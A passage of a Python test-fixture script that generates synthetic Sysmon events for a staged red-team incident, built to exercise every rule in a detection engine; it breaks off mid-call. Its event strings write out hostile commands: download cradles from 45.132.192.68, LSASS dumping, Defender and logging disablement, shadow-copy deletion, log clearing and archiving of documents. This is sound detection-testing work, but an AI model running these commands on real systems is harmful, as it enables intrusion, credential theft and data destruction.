#!/usr/bin/env python3
"""Seed one incident that exercises every rule in the corpus.

seed_apt.py tells one attacker's story end to end. This script has a different
job: it is a regression fixture and a coverage demo, built to fire all 80 rules
-- across every EventID the engine understands (1, 3, 6, 7, 8, 10, 11, 12, 13,
17, 20) plus a handful of EventIDs no rule keys on (18, 19, 21, 22, 23) added
purely so the incident's raw event stream and process tree show the full
breadth of what Sysmon reports -- while staying ONE incident: everything hangs
off a single process-tree root, and no gap between events exceeds the
correlation window, so the correlator never splits it in two.

That means trading realism for coverage. No real intrusion touches IIS, SQL
Server, PsExec, WMI/DCOM, CMSTP, and a phishing macro in the same twenty
minutes. Read this less as "an attacker" and more as "a red-team range built to
walk every technique the detection engineering README talks about" -- which is
exactly why the host is named WKSTN-RANGE-01 rather than a real employee's
machine. The phases, roughly in kill-chain order:

    explorer.exe
      └─ OUTLOOK.EXE                         phishing foothold
          ├─ WINWORD.EXE                     macro drops a script (SYS-051)
          │   └─ cmd.exe                     office spawns a shell (SYS-001)
          └─ mshta.exe                       HTA attachment (SYS-001, SYS-005)
              └─ cmd.exe ("ops")             dispatcher for everything below
                  ├─ encoded / cradle powershell, recon burst (whoami/net/
                  │   nltest/systeminfo), cscript encoded script host
                  ├─ registry tampering: Run key, Defender, IFEO, UAC-bypass
                  │   hijack, PS logging disabled, CLM lockdown removed,
                  │   netsh portproxy
                  ├─ LOLBAS: cmstp, regsvr32 Squiblydoo, certutil (download +
                  │   decode), Start-BitsTransfer, control.exe .cpl
                  ├─ three rundll32 children: bare (C2 + named pipe + beacon +
                  │   injection), comsvcs MiniDump (+ LSASS access), url.dll
                  │   OpenURL (+ child wscript)
                  ├─ masquerading svchost.exe, a PE stamped CALC.EXE staged in
                  │   Temp (SYS-092), a dropped payload.exe (BYOVD driver +
                  │   unmanaged PowerShell + startup persistence)
                  ├─ wmic.exe registering a WMI event consumer
                  ├─ ransomware.exe: shadow-copy deletion, a ransom note, and
                  │   several .locked files
                  ├─ coverage-expansion pass 1: schtasks /create, a service
                  │   pointed at a staged binary, a remote thread into LSASS,
                  │   a firewall allow rule, wevtutil cl, a passworded rar
                  │   archive, InstallUtil against a staged DLL, a remote
                  │   mshta HTA, hh.exe against a staged .chm, a remote MSI,
                  │   a net.exe admin-group add, sc stopping WinDefend,
                  │   sdelete, cipher /w, and RDP enabled via registry
                  │   (SYS-093 through SYS-107)
                  └─ coverage-expansion pass 2: reg.exe saving the SAM hive,
                      procdump against lsass, ntdsutil NTDS.dit extraction,
                      mavinject injection, wsl -e, MSBuild against a staged
                      project, forfiles against a staged target, a tscon
                      session hijack, SharpHound, rclone, Rubeus, a
                      PowerShell v2 downgrade, an AMSI-bypass command line,
                      bitsadmin /transfer, a COM CLSID hijack, and a
                      token-theft tool keyword (SYS-108 through SYS-123)
              └─ ftp.exe -s:script -> cmd.exe               (SYS-079)
      ├─ wmiprvse.exe          remote WMI/DCOM persistence   (SYS-078)
      ├─ PSEXESVC.exe          lateral movement arrival      (SYS-072, SYS-073)
      ├─ w3wp.exe -> cmd.exe, appcmd.exe                     (SYS-088/038/039)
      ├─ sqlservr.exe -> cmd.exe                             (SYS-089)
      ├─ wsmprovhost.exe -> hostname.exe                     (SYS-090)
      └─ lsass.exe             direct SAM write              (SYS-091)

    python scripts/seed_full_coverage.py
"""

from __future__ import annotations

import argparse
import random
from datetime import datetime, timedelta, timezone

from seed_common import EventFactory, post_events

HOST = "WKSTN-RANGE-01"
USER = "CORP\\redteam.ops"
BASE = datetime.now(timezone.utc) - timedelta(minutes=15)

# All 80 rule IDs the corpus ships today, so main() can report exactly what
# (if anything) did not fire.
EXPECTED_RULES = {
    "SYS-001", "SYS-002", "SYS-003", "SYS-004", "SYS-005", "SYS-006", "SYS-007",
    "SYS-008", "SYS-009", "SYS-010", "SYS-020", "SYS-021", "SYS-030", "SYS-031",
    "SYS-032", "SYS-034", "SYS-035", "SYS-036", "SYS-037", "SYS-038", "SYS-039",
    "SYS-040", "SYS-041", "SYS-050", "SYS-051", "SYS-060", "SYS-070", "SYS-071",
    "SYS-072", "SYS-073", "SYS-074", "SYS-075", "SYS-076", "SYS-077", "SYS-078",
    "SYS-079", "SYS-080", "SYS-081", "SYS-082", "SYS-083", "SYS-084", "SYS-085",
    "SYS-086", "SYS-087", "SYS-088", "SYS-089", "SYS-090", "SYS-091", "SYS-092",
    "SYS-093", "SYS-094", "SYS-095", "SYS-096", "SYS-097", "SYS-098", "SYS-099",
    "SYS-100", "SYS-101", "SYS-102", "SYS-103", "SYS-104", "SYS-105", "SYS-106",
    "SYS-107", "SYS-108", "SYS-109", "SYS-110", "SYS-111", "SYS-112", "SYS-113",
    "SYS-114", "SYS-115", "SYS-116", "SYS-117", "SYS-118", "SYS-119", "SYS-120",
    "SYS-121", "SYS-122", "SYS-123",
}


# at()/proc()/raw_event() moved to seed_common.py, shared with seed_apt.py
# and seed_rw.py -- this script's proc() (with automatic ParentImage lookup
# via a guid->image map, and a per-call `user` override) was the most
# complete of the three copies, and is now EventFactory's implementation.
# Bound as plain names so events() below, which calls them bare throughout,
# did not need to change.
_factory = EventFactory(
    host=HOST,
    user=USER,
    base=BASE,
    logon_id="0x9a41f7",
    default_cwd=r"C:\Users\redteam.ops\Downloads",
)
at = _factory.at
proc = _factory.proc
raw_event = _factory.raw_event


# GUIDs for every actor in the tree. A handful (wmiprvse, PSEXESVC, w3wp,
# sqlservr, wsmprovhost, lsass) are parented directly under root rather than
# under "ops": they represent arrivals from the network (WMI/DCOM, PsExec,
# already-running services) rather than children of the phishing chain, but
# they still share the same root so the correlator keeps everything as one
# incident.
G = {
    "root": "{rng-explorer}",
    "outlook": "{rng-outlook}",
    "word": "{rng-word}",
    "word_cmd": "{rng-word-cmd}",
    "mshta": "{rng-mshta}",
    "ops": "{rng-ops-cmd}",
    "ps_enc": "{rng-ps-enc}",
    "ps_cradle": "{rng-ps-cradle}",
    "whoami": "{rng-whoami}",
    "net": "{rng-net}",
    "nltest": "{rng-nltest}",
    "systeminfo": "{rng-systeminfo}",
    "cscript_enc": "{rng-cscript-enc}",
    "reg_run": "{rng-reg-run}",
    "reg_defender": "{rng-reg-defender}",
    "reg_ifeo": "{rng-reg-ifeo}",
    "ps_uac": "{rng-ps-uac}",
    "reg_pslog": "{rng-reg-pslog}",
    "ps_clm": "{rng-ps-clm}",
    "netsh": "{rng-netsh}",
    "cmstp": "{rng-cmstp}",
    "regsvr32": "{rng-regsvr32}",
    "certutil_dl": "{rng-certutil-dl}",
    "certutil_dec": "{rng-certutil-dec}",
    "bits": "{rng-bits}",
    "cpl": "{rng-cpl}",
    "rundll_bare": "{rng-rundll-bare}",
    "rundll_dump": "{rng-rundll-dump}",
    "rundll_url": "{rng-rundll-url}",
    "wscript_child": "{rng-wscript-child}",
    "svchost_masq": "{rng-svchost-masq}",
    "calc_masq": "{rng-calc-masq}",
    "payload": "{rng-payload}",
    "wmic": "{rng-wmic}",
    "wmiprvse": "{rng-wmiprvse}",
    "ftp": "{rng-ftp}",
    "ftp_cmd": "{rng-ftp-cmd}",
    "psexec": "{rng-psexec}",
    "w3wp": "{rng-w3wp}",
    "w3wp_cmd": "{rng-w3wp-cmd}",
    "appcmd": "{rng-appcmd}",
    "sqlservr": "{rng-sqlservr}",
    "sql_cmd": "{rng-sql-cmd}",
    "wsmprovhost": "{rng-wsmprovhost}",
    "hostname": "{rng-hostname}",
    "lsass": "{rng-lsass}",
    "ransom": "{rng-ransom}",
    # Coverage-expansion pass (SYS-093 through SYS-107).
    "schtasks": "{rng-schtasks}",
    "svc_installer": "{rng-svc-installer}",
    "netsh_fw": "{rng-netsh-fw}",
    "wevtutil": "{rng-wevtutil}",
    "rar_archive": "{rng-rar-archive}",
    "installutil": "{rng-installutil}",
    "mshta_remote": "{rng-mshta-remote}",
    "hh_help": "{rng-hh-help}",
    "msiexec_remote": "{rng-msiexec-remote}",
    "net_admin": "{rng-net-admin}",
    "sc_stop": "{rng-sc-stop}",
    "sdelete": "{rng-sdelete}",
    "cipher_wipe": "{rng-cipher-wipe}",
    "reg_rdp": "{rng-reg-rdp}",
    # Coverage-expansion pass 2 (SYS-108 through SYS-123).
    "reg_hive_dump": "{rng-reg-hive-dump}",
    "procdump": "{rng-procdump}",
    "ntdsutil": "{rng-ntdsutil}",
    "mavinject": "{rng-mavinject}",
    "wsl": "{rng-wsl}",
    "msbuild": "{rng-msbuild}",
    "forfiles": "{rng-forfiles}",
    "tscon": "{rng-tscon}",
    "sharphound": "{rng-sharphound}",
    "rclone": "{rng-rclone}",
    "rubeus": "{rng-rubeus}",
    "ps_downgrade": "{rng-ps-downgrade}",
    "ps_amsi": "{rng-ps-amsi}",
    "bitsadmin": "{rng-bitsadmin}",
    "com_hijack": "{rng-com-hijack}",
    "juicypotato": "{rng-juicypotato}",
}


def events() -> list[dict]:
    ev: list[dict] = []
    t = 0.0

    def step(n: float = 1.0) -> float:
        nonlocal t
        t += n
        return t

    # --- Foothold: explorer -> Outlook (benign, builds the tree top) ---
    ev.append(proc(step(0), G["root"], "{rng-boot}", r"C:\Windows\explorer.exe",
                    "explorer.exe", pid=3120, ppid=780))
    ev.append(proc(step(2), G["outlook"], G["root"],
                    r"C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE",
                    '"OUTLOOK.EXE"', pid=4212, ppid=3120))

    # --- WINWORD.EXE drops a script (SYS-051) then spawns a shell (SYS-001) ---
    ev.append(proc(step(3), G["word"], G["outlook"],
                    r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE",
                    r'"WINWORD.EXE" /n "C:\Users\redteam.ops\Downloads\Invoice_Q3.docm"',
                    pid=4388, ppid=4212,
                    hashes="SHA256=9f2b4a1c8e7d3f6a0b5c9e2d1f4a7b8c"))
    ev.append(raw_event(11, step(1), Image=r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE",
                         ProcessGuid=G["word"],
                         TargetFilename=r"C:\Users\redteam.ops\AppData\Local\Temp\dropper.vbs"))
    ev.append(proc(step(1), G["word_cmd"], G["word"], r"C:\Windows\System32\cmd.exe",
                    r'cmd.exe /c cscript.exe //nologo dropper.vbs', pid=4402, ppid=4388,
                    parent_cmdline=r'"WINWORD.EXE" /n "Invoice_Q3.docm"'))

    # --- mshta.exe: second phishing vector, direct child of Outlook (SYS-001 + SYS-005) ---
    ev.append(proc(step(2), G["mshta"], G["outlook"], r"C:\Windows\System32\mshta.exe",
                    r'mshta.exe "C:\Users\redteam.ops\Downloads\Remittance.hta"',
                    pid=4460, ppid=4212))

    # --- "ops": the dispatcher every later branch hangs off ---
    ev.append(proc(step(1), G["ops"], G["mshta"], r"C:\Windows\System32\cmd.exe",
                    "cmd.exe /c start /min", pid=4510, ppid=4460))

    # === Execution / obfuscation ===
    ev.append(proc(step(1), G["ps_enc"], G["ops"],
                    r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                    r"powershell -nop -w hidden -enc "
                    r"SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAn",
                    pid=4600, ppid=4510))
    ev.append(proc(step(1), G["ps_cradle"], G["ops"],
                    r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                    r"powershell -nop -w hidden -c \"IEX (New-Object Net.WebClient)."
                    r"DownloadString('http://45.132.192.68/stage2.ps1')\"",
                    pid=4610, ppid=4510))
    ev.append(raw_event(3, step(1), Image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                         ProcessGuid=G["ps_cradle"], DestinationIp="45.132.192.68",
                         DestinationPort="443", DestinationHostname="cdn-edge-7.telemetry-sync.net"))
    ev.append(raw_event(22, step(1), Image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                         ProcessGuid=G["ps_cradle"], QueryName="cdn-edge-7.telemetry-sync.net",
                         QueryResults="45.132.192.68"))

    # --- Recon burst under the cradle (4 distinct techniques -> discovery bonus) ---
    ev.append(proc(step(2), G["whoami"], G["ps_cradle"], r"C:\Windows\System32\whoami.exe",
                    "whoami /all", pid=4700, ppid=4610))
    ev.append(proc(step(1), G["net"], G["ps_cradle"], r"C:\Windows\System32\net.exe",
                    'net group "Domain Admins" /domain', pid=4710, ppid=4610))
    ev.append(proc(step(1), G["nltest"], G["ps_cradle"], r"C:\Windows\System32\nltest.exe",
                    "nltest /dclist:corp.local", pid=4720, ppid=4610))
    ev.append(proc(step(1), G["systeminfo"], G["ps_cradle"], r"C:\Windows\System32\systeminfo.exe",
                    "systeminfo", pid=4730, ppid=4610))

    ev.append(proc(step(1), G["cscript_enc"], G["ops"], r"C:\Windows\System32\cscript.exe",
                    r'cscript.exe //B /e:jscript.encode C:\Users\redteam.ops\AppData\Local\Temp\update.jse',
                    pid=4740, ppid=4510))

    # === Persistence / defense evasion (registry) ===
    ev.append(proc(step(1), G["reg_run"], G["ops"], r"C:\Windows\System32\reg.exe",
                    r"reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run "
                    r"/v OneDriveSync /t REG_SZ /d C:\Users\redteam.ops\AppData\Roaming\sync.exe /f",
                    pid=4750, ppid=4510))
    ev.append(raw_event(13, step(1), Image=r"C:\Windows\System32\reg.exe", ProcessGuid=G["reg_run"],
                         TargetObject=r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run\OneDriveSync",
                         Details=r"C:\Users\redteam.ops\AppData\Roaming\sync.exe"))

    ev.append(proc(step(1), G["reg_defender"], G["ops"], r"C:\Windows\System32\reg.exe",
                    r"reg add HKLM\SOFTWARE\Policies\Microsoft\Windows Defender "
                    r"/v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f",
                    pid=4760, ppid=4510))
    ev.append(raw_event(13, step(1), Image=r"C:\Windows\System32\reg.exe", ProcessGuid=G["reg_defender"],
                         TargetObject=r"HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\DisableRealtimeMonitoring",
                         Details="DWORD (0x00000001)"))

    ev.append(proc(step(1), G["reg_ifeo"], G["ops"], r"C:\Windows\System32\reg.exe",
                    r"reg add \"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution "
                    r"Options\sethc.exe\" /v Debugger /t REG_SZ /d C:\Windows\System32\cmd.exe /f",
                    pid=4770, ppid=4510))
    ev.append(raw_event(13, step(1), Image=r"C:\Windows\System32\reg.exe", ProcessGuid=G["reg_ifeo"],
                         TargetObject=r"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe\Debugger",
                         Details=r"C:\Windows\System32\cmd.exe"))

    ev.append(proc(step(1), G["ps_uac"], G["ops"],
                    r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                    r"powershell -nop -c \"New-Item -Path 'HKCU:\Software\Classes\ms-settings\shell\open\command' "
                    r"-Force; Set-ItemProperty -Path 'HKCU:\Software\Classes\ms-settings\shell\open\command' "
                    r"-Name '(default)' -Value 'C:\Windows\System32\cmd.exe /c calc.exe'\"",
                    pid=4780, ppid=4510))
    ev.append(raw_event(13, step(1), Image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                         ProcessGuid=G["ps_uac"],
                         TargetObject=r"HKCU\Software\Classes\ms-settings\shell\open\command\(Default)",
                         Details=r"C:\Windows\System32\cmd.exe /c calc.exe"))

    ev.append(proc(step(1), G["reg_pslog"], G["ops"], r"C:\Windows\System32\reg.exe",
                    r"reg add HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging "
                    r"/v EnableScriptBlockLogging /t REG_DWORD /d 0 /f",
                    pid=4790, ppid=4510))
    ev.append(raw_event(13, step(1), Image=r"C:\Windows\System32\reg.exe", ProcessGuid=G["reg_pslog"],
                         TargetObject=r"HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging\EnableScriptBlockLogging",
                         Details="DWORD (0x00000000)"))

    ev.append(proc(step(1), G["ps_clm"], G["ops"],
                    r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                    r"powershell -nop -c \"Remove-ItemProperty -Path "
                    r"'HKLM:\System\CurrentControlSet\Control\SESSION MANAGER\Environment' "
                    r"-Name __PSLockdownPolicy\"",
                    pid=4800, ppid=4510))
    ev.append(raw_event(12, step(1), Image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                         ProcessGuid=G["ps_clm"], EventType="DeleteValue",
                         TargetObject=r"HKLM\System\CurrentControlSet\Control\SESSION MANAGER\Environment\__PSLockdownPolicy"))

    ev.append(proc(step(1), G["netsh"], G["ops"], r"C:\Windows\System32\netsh.exe",
                    "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 "
                    "connectport=3389 connectaddress=10.10.10.5",
                    pid=4810, ppid=4510))
    ev.append(raw_event(13, step(1), Image=r"C:\Windows\System32\netsh.exe", ProcessGuid=G["netsh"],
                         TargetObject=r"HKLM\System\CurrentControlSet\services\PortProxy\v4tov4\tcp\0.0.0.0/8080",
                         Details="10.10.10.5/3389"))

    # === LOLBAS / additional execution vectors ===
    ev.append(proc(step(1), G["cmstp"], G["ops"], r"C:\Windows\System32\cmstp.exe",
                    r'"C:\Windows\System32\cmstp.exe" /au C:\Users\redteam.ops\AppData\Local\Temp\evil.inf',
                    pid=4820, ppid=4510))

    ev.append(proc(step(1), G["regsvr32"], G["ops"], r"C:\Windows\System32\regsvr32.exe",
                    "regsvr32.exe /s /u /i:http://45.132.192.68/evil.sct scrobj.dll",
                    pid=4830, ppid=4510))
    ev.append(raw_event(3, step(0), Image=r"C:\Windows\System32\regsvr32.exe", ProcessGuid=G["regsvr32"],
                         DestinationIp="45.132.192.68", DestinationPort="80",
                         DestinationHostname="45.132.192.68"))

    ev.append(proc(step(1), G["certutil_dl"], G["ops"], r"C:\Windows\System32\certutil.exe",
                    "certutil.exe -urlcache -split -f http://45.132.192.68/stage3.exe "
                    r"C:\Users\redteam.ops\AppData\Local\Temp\stage3.exe",
                    pid=4840, ppid=4510))
    ev.append(raw_event(3, step(0), Image=r"C:\Windows\System32\certutil.exe", ProcessGuid=G["certutil_dl"],
                         DestinationIp="45.132.192.68", DestinationPort="80",
                         DestinationHostname="45.132.192.68"))

    ev.append(proc(step(1), G["certutil_dec"], G["ops"], r"C:\Windows\System32\certutil.exe",
                    r"certutil.exe -decode payload.b64 payload.exe", pid=4850, ppid=4510))

    ev.append(proc(step(1), G["bits"], G["ops"],
                    r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                    r"Start-BitsTransfer -Source http://45.132.192.68/stage4.exe "
                    r"-Destination C:\Users\redteam.ops\AppData\Local\Temp\stage4.exe",
                    pid=4860, ppid=4510))

    ev.append(proc(step(1), G["cpl"], G["ops"], r"C:\Windows\System32\control.exe",
                    r"control.exe C:\Users\redteam.ops\Downloads\Invoice.cpl", pid=4870, ppid=4510))

    # === Three rundll32 children ===
    # 1) Bare rundll32: injected C2, named pipe, beacon loop, injection into explorer
    ev.append(proc(step(1), G["rundll_bare"], G["ops"], r"C:\Windows\System32\rundll32.exe",
                    "rundll32.exe", pid=4880, ppid=4510))
    ev.append(raw_event(17, step(1), Image=r"C:\Windows\System32\rundll32.exe",
                         ProcessGuid=G["rundll_bare"], PipeName=r"\msagent_7e"))
    ev.append(raw_event(18, step(0), Image=r"C:\Windows\System32\rundll32.exe",
                         ProcessGuid=G["rundll_bare"], PipeName=r"\msagent_7e"))
    ev.append(raw_event(8, step(1), SourceImage=r"C:\Windows\System32\rundll32.exe",
                         SourceProcessGUID=G["rundll_bare"], TargetImage=r"C:\Windows\explorer.exe",
                         TargetProcessGuid=G["root"], NewThreadId="9412"))
    ev.append(raw_event(22, step(1), Image=r"C:\Windows\System32\rundll32.exe",
                         ProcessGuid=G["rundll_bare"], QueryName="cdn-edge-7.telemetry-sync.net",
                         QueryResults="45.132.192.68"))
    random.seed(4242)
    clock = step(2)
    for _ in range(8):
        ev.append(raw_event(3, clock, Image=r"C:\Windows\System32\rundll32.exe",
                             ProcessGuid=G["rundll_bare"], DestinationIp="45.132.192.68",
                             DestinationPort="4444", DestinationHostname="cdn-edge-7.telemetry-sync.net"))
        clock = step(40 * (1 - random.uniform(0, 0.3)))

    # 2) comsvcs.dll MiniDump against LSASS
    ev.append(proc(step(1), G["rundll_dump"], G["ops"], r"C:\Windows\System32\rundll32.exe",
                    r"rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 668 "
                    r"C:\Windows\Temp\lsass2.dmp full",
                    pid=4900, ppid=4510, integrity="High"))
    ev.append(raw_event(10, step(1), SourceImage=r"C:\Windows\System32\rundll32.exe",
                         SourceProcessGUID=G["rundll_dump"], TargetImage=r"C:\Windows\System32\lsass.exe",
                         GrantedAccess="0x1410", User=USER))

    # 3) url.dll,OpenURL -> spawns wscript.exe
    ev.append(proc(step(1), G["rundll_url"], G["ops"], r"C:\Windows\System32\rundll32.exe",
                    r"rundll32.exe url.dll,OpenURL file://C:/Users/redteam.ops/Downloads/stage5.hta",
                    pid=4910, ppid=4510))
    ev.append(proc(step(1), G["wscript_child"], G["rundll_url"], r"C:\Windows\System32\wscript.exe",
                    r"wscript.exe C:\Users\redteam.ops\Downloads\stage5.js", pid=4920, ppid=4910))

    # === Masquerading, dropped payload, BYOVD, unmanaged PowerShell, startup persistence ===
    ev.append(proc(step(1), G["svchost_masq"], G["ops"], r"C:\Users\Public\svchost.exe",
                    "svchost.exe -k netsvcs", pid=4930, ppid=4510))

    # PE metadata masquerade: internally stamped CALC.EXE, staged in Temp.
    ev.append(proc(step(1), G["calc_masq"], G["ops"],
                    r"C:\Users\redteam.ops\AppData\Local\Temp\Dyxxur4gx.exe",
                    r'"Dyxxur4gx.exe"', pid=4935, ppid=4510,
                    OriginalFileName="CALC.EXE", Description="Windows Calculator",
                    Company="Microsoft Corporation"))

    ev.append(proc(step(1), G["payload"], G["ops"],
                    r"C:\Users\redteam.ops\AppData\Local\Temp\update.exe",
                    r"update.exe -install", pid=4940, ppid=4510, integrity="High"))
    ev.append(raw_event(6, step(1), Image=r"C:\Users\redteam.ops\AppData\Local\Temp\update.exe",
                         ProcessGuid=G["payload"], ImageLoaded=r"C:\Windows\Temp\rtcore64.sys",
                         Signed="false", Signature="(Unsigned)"))
    ev.append(raw_event(7, step(1), Image=r"C:\Users\redteam.ops\AppData\Local\Temp\update.exe",
                         ProcessGuid=G["payload"],
                         ImageLoaded=r"C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation"
                         r"\v4.0_3.0.0.0__31bf3856ad364e35\System.Management.Automation.dll"))
    ev.append(raw_event(11, step(1), Image=r"C:\Users\redteam.ops\AppData\Local\Temp\update.exe",
                         ProcessGuid=G["payload"],
                         TargetFilename=r"C:\Users\redteam.ops\AppData\Roaming\Microsoft\Windows\Start Menu"
                         r"\Programs\Startup\update.lnk"))
    ev.append(raw_event(23, step(1), Image=r"C:\Users\redteam.ops\AppData\Local\Temp\update.exe",
                         ProcessGuid=G["payload"],
                         TargetFilename=r"C:\Users\redteam.ops\AppData\Local\Temp\update.exe.tmp"))

    # === WMI event-consumer persistence ===
    ev.append(proc(step(1), G["wmic"], G["ops"], r"C:\Windows\System32\wbem\WMIC.exe",
                    r'"C:\Windows\System32\wbem\WMIC.exe" /namespace:"\\root\subscription" '
                    r'PATH CommandLineEventConsumer CREATE Name="WinUpdater", '
                    r'ExecutablePath="cmd.exe", CommandLineTemplate="cmd.exe /c calc.exe"',
                    pid=4950, ppid=4510))
    ev.append(raw_event(19, step(1), ProcessGuid=G["wmic"], EventType="WmiFilterEvent",
                         Operation="Created", User=USER, EventNamespace=r"root\cimv2",
                         Name="WinUpdaterFilter"))
    ev.append(raw_event(20, step(1), ProcessGuid=G["wmic"], EventType="WmiConsumerEvent",
                         Operation="Created", User=USER, Name="WinUpdater",
                         Type="Command Line", Destination="cmd.exe /c calc.exe"))
    ev.append(raw_event(21, step(1), ProcessGuid=G["wmic"], EventType="WmiBindingEvent",
                         Operation="Created", User=USER,
                         Consumer='CommandLineEventConsumer.Name="WinUpdater"',
                         Filter='__EventFilter.Name="WinUpdaterFilter"'))

    # === Ransomware finale, off "ops" ===
    ev.append(proc(step(2), G["ransom"], G["ops"], r"C:\Users\redteam.ops\AppData\Local\Temp\ransom.exe",
                    "ransom.exe --encrypt", pid=4960, ppid=4510, integrity="High"))
    ev.append(proc(step(1), "{rng-vssadmin}", G["ransom"], r"C:\Windows\System32\vssadmin.exe",
                    "vssadmin.exe delete shadows /all /quiet", pid=4970, ppid=4960, integrity="High"))
    ev.append(raw_event(11, step(1), Image=r"C:\Users\redteam.ops\AppData\Local\Temp\ransom.exe",
                         ProcessGuid=G["ransom"],
                         TargetFilename=r"C:\Users\redteam.ops\Desktop\HOW_TO_DECRYPT_FILES.txt"))
    for name in ("Finance_Q3.xlsx", "Board_Minutes.docx", "Customer_List.csv"):
        ev.append(raw_event(11, step(1), Image=r"C:\Users\redteam.ops\AppData\Local\Temp\ransom.exe",
                             ProcessGuid=G["ransom"],
                             TargetFilename=rf"C:\Users\redteam.ops\Documents\{name}.locked"))
    ev.append(raw_event(23, step(1), Image=r"C:\Users\redteam.ops\AppData\Local\Temp\ransom.exe",
                         ProcessGuid=G["ransom"],
                         TargetFilename=r"C:\Users\redteam.ops\AppData\Local\Microsoft\Windows\Backup\catalog.wbcat"))

    # === Coverage-expansion pass: SYS-093 through SYS-107, off "ops" ===
    ev.append(proc(step(1), G["schtasks"], G["ops"], r"C:\Windows\System32\schtasks.exe",
                    r"schtasks /create /tn WinUpdaterTask /tr "
                    r"C:\Users\redteam.ops\AppData\Roaming\sync2.exe /sc onlogon /ru SYSTEM",
                    pid=5100, ppid=4510))

    ev.append(proc(step(1), G["svc_installer"], G["ops"], r"C:\Windows\System32\sc.exe",
                    r"sc.exe create WinUpdSvc binPath= "
                    r"C:\Users\redteam.ops\AppData\Local\Temp\svc.exe start= auto",
                    pid=5110, ppid=4510))
    ev.append(raw_event(13, step(1), Image=r"C:\Windows\System32\sc.exe", ProcessGuid=G["svc_installer"],
                         TargetObject=r"HKLM\SYSTEM\CurrentControlSet\Services\WinUpdSvc\ImagePath",
                         Details=r"C:\Users\redteam.ops\AppData\Local\Temp\svc.exe"))

    # Same payload.exe that loaded the BYOVD driver also reaches into LSASS
    # via a remote thread rather than a memory read.
    ev.append(raw_event(8, step(1), SourceImage=r"C:\Users\redteam.ops\AppData\Local\Temp\update.exe",
                         SourceProcessGUID=G["payload"], TargetImage=r"C:\Windows\System32\lsass.exe",
                         TargetProcessGuid=G["lsass"], NewThreadId="9512"))

    ev.append(proc(step(1), G["netsh_fw"], G["ops"], r"C:\Windows\System32\netsh.exe",
                    "netsh advfirewall firewall add rule name=WinUpdSvc dir=in action=allow "
                    "protocol=TCP localport=4444", pid=5120, ppid=4510))

    ev.append(proc(step(1), G["wevtutil"], G["ops"], r"C:\Windows\System32\wevtutil.exe",
                    "wevtutil cl Security", pid=5130, ppid=4510, integrity="High"))

    ev.append(proc(step(1), G["rar_archive"], G["ops"], r"C:\Program Files\WinRAR\rar.exe",
                    r"rar.exe a -pS3cr3t99 C:\Users\redteam.ops\AppData\Local\Temp\exfil.rar "
                    r"C:\Users\redteam.ops\Documents", pid=5140, ppid=4510))

    ev.append(proc(step(1), G["installutil"], G["ops"],
                    r"C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe",
                    r"InstallUtil.exe C:\Users\redteam.ops\AppData\Local\Temp\stage6.dll",
                    pid=5150, ppid=4510))

    ev.append(proc(step(1), G["mshta_remote"], G["ops"], r"C:\Windows\System32\mshta.exe",
                    "mshta.exe http://45.132.192.68/second.hta", pid=5160, ppid=4510))

    ev.append(proc(step(1), G["hh_help"], G["ops"], r"C:\Windows\hh.exe",
                    r"hh.exe C:\Users\redteam.ops\AppData\Local\Temp\help.chm",
                    pid=5170, ppid=4510))

    ev.append(proc(step(1), G["msiexec_remote"], G["ops"], r"C:\Windows\System32\msiexec.exe",
                    "msiexec.exe /i http://45.132.192.68/pkg.msi /qn", pid=5180, ppid=4510))

    ev.append(proc(step(1), G["net_admin"], G["ops"], r"C:\Windows\System32\net.exe",
                    "net.exe localgroup administrators redteam.ops /add", pid=5190, ppid=4510))

    ev.append(proc(step(1), G["sc_stop"], G["ops"], r"C:\Windows\System32\sc.exe",
                    "sc.exe stop WinDefend", pid=5200, ppid=4510, integrity="High"))

    ev.append(proc(step(1), G["sdelete"], G["ops"],
                    r"C:\Users\redteam.ops\AppData\Local\Temp\sdelete64.exe",
                    r"sdelete64.exe -p 3 -z C:", pid=5210, ppid=4510, integrity="High"))

    ev.append(proc(step(1), G["cipher_wipe"], G["ops"], r"C:\Windows\System32\cipher.exe",
                    r"cipher.exe /w:C:\Users\redteam.ops\AppData\Local\Temp",
                    pid=5220, ppid=4510))

    ev.append(proc(step(1), G["reg_rdp"], G["ops"], r"C:\Windows\System32\reg.exe",
                    r"reg add \"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\" "
                    r"/v fDenyTSConnections /t REG_DWORD /d 0 /f",
                    pid=5230, ppid=4510))
    ev.append(raw_event(13, step(1), Image=r"C:\Windows\System32\reg.exe", ProcessGuid=G["reg_rdp"],
                         TargetObject=r"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\fDenyTSConnections",
                         Details="DWORD (0x00000000)"))

    # === Coverage-expansion pass 2: SYS-108 through SYS-123, off "ops" ===
    ev.append(proc(step(1), G["reg_hive_dump"], G["ops"], r"C:\Windows\System32\reg.exe",
